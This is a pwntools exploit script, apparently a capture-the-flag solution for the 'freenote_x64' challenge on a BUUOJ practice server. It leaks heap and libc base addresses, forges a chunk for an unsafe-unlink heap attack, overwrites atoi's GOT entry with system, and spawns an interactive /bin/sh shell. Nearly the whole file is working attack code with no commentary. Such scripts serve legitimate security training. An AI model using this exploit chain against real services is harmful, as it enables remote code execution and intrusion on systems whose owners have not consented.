from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('freenote_x64')
io = remote('node4.buuoj.cn', 29656)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('freenote_x64')
atoi_got = elf.got['atoi']

def show():
    io.sendlineafter('Your choice: ', '1')


def add(size, content):
    io.sendlineafter('Your choice: ', '2')
    io.sendlineafter('Length of new note: ', str(size))
    io.sendafter('Enter your note: ', content)


def edit(index, size, content):
    io.sendlineafter('Your choice: ', '3')
    io.sendlineafter('Note number: ', str(index))
    io.sendlineafter('Length of note: ', str(size))
    io.sendafter('Enter your note: ', content)


def delete(index):
    io.sendlineafter('Your choice: ', '4')
    io.sendlineafter('Note number: ', str(index))


def leak():
    global heap_base, libc_base
    add(0x80, b'a' * 0x80)          # 0
    add(0x80, b'b' * 0x80)          # 1
    add(0x80, b'c' * 0x80)          # 2
    add(0x80, b'd' * 0x80)          # 3
    delete(0)
    delete(2)
    add(0x8, b'a' * 0x8)            # 0
    add(0x8, b'c' * 0x8)            # 2
    show()
    io.recvuntil('0. aaaaaaaa')
    heap_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x1940  
    io.recvuntil('2. cccccccc')
    libc_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x68
    log.success('heap_base: ' + hex(heap_base))
    log.success('libc_base: ' + hex(libc_base))


def unlink():
    delete(3)
    delete(2)
    delete(1)
    chunk0 = heap_base + 0x30
    top_chunk_size = 0x206c1
    fd, bk = chunk0 - 0x18, chunk0 - 0x10
    payload = p64(0) + p64(0x81) + p64(fd) + p64(bk) + b'a' * 0x60  # fake_chunk0
    payload += p64(0x80) + p64(0x100) + b'b' * 0xf0                 # chunk1
    edit(0, len(payload), payload)
    delete(1)


def pwn():
    payload = p64(0) + p64(1) + p64(8) + p64(atoi_got) + b'\x00' * 0x160
    edit(0, 0x180, payload)
    system = libc_base + libc.sym['system']
    edit(0, 8, p64(system))
    # gdb.attach(io)
    # pause()
    io.sendlineafter('Your choice: ', '/bin/sh')
    io.interactive()


if __name__ == '__main__':
    leak()
    unlink()
    pwn()
